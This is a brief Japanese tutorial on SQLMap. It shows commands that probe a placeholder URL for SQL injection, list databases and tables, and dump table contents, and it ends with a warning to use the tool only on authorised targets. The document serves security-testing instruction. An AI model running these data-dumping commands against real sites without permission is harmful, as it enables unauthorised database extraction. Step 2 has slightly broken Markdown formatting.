## SQLMapとは？

SQLMapは、WebサイトのSQLインジェクション脆弱性を自動で検査・攻撃できるツール。データベースの情報を取得したり、データを抜き出すことが可能。

## 主な使い方

1. **脆弱性の検査**
	- 指定したURLにSQLインジェクションがあるか調べる
	```
	sqlmap -u "http://example.com/vuln.php?id=1"
	```

2. **データベース一覧の取得
	sqlmap -u "http://example.com/vuln.php?id=1" --dbs
	```

3. **テーブル一覧の取得**
	```
	sqlmap -u "http://example.com/vuln.php?id=1" -D データベース名 --tables
	```

4. **テーブルの中身を抽出**
	```
	sqlmap -u "http://example.com/vuln.php?id=1" -D データベース名 -T テーブル名 --dump
	```

## 注意事項

- SQLMapは大量のリクエストを送信します。許可を得た対象以外には絶対に使わない。
- 実行するとアクセス元IPが記録されるため、無断での使用は違法行為となる場合がある。